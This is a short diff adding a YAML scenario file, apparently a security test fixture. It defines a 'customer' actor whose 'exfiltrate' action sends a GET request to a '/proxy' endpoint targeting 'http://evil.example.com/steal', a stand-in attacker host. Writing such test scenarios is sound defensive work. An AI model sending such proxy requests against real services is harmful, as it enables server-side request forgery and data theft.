@@ -1,0 +1,7 @@
+version: 1
+actors:
+  - name: customer
+actions:
+  - name: exfiltrate
+    actor: customer
+    request: {method: GET, path: "/proxy", query: {target: "http://evil.example.com/steal"}}
